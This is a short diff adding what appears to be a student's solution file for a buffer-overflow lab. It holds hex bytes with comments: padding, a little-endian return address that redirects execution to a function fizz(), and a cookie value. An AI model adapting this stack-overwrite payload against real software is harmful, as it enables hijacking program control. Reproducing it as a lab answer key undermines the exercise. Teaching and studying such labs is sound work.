@@ -1,0 +1,15 @@
+/* padding required:	44bytes */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* fizz() located at:0x8048cba */
+
+ba 8c 04 08
+
+/* padding reqiured:	4bytes */
+
+00 00 00 00
+
+/* cookie value:0x5e448a70 */
+
+70 8a 44 5e
